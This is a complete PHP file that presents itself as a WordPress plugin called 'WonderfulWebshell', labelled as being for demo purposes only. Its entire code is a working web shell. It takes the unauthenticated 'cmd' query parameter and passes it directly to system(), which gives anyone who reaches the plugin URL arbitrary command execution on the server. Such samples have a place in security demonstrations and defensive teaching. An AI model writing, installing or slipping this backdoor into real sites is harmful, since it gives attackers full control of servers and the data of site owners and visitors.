<?php
/**
* Plugin Name: WonderfulWebshell
* Plugin URI: https://github.com/jckhmr/wonderfullwebshell
* Description: Wordpress webshell used for demo purposes only
* Version: 1.0
* Author: jckhmr
* Author URI: https://jckhmr.net
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
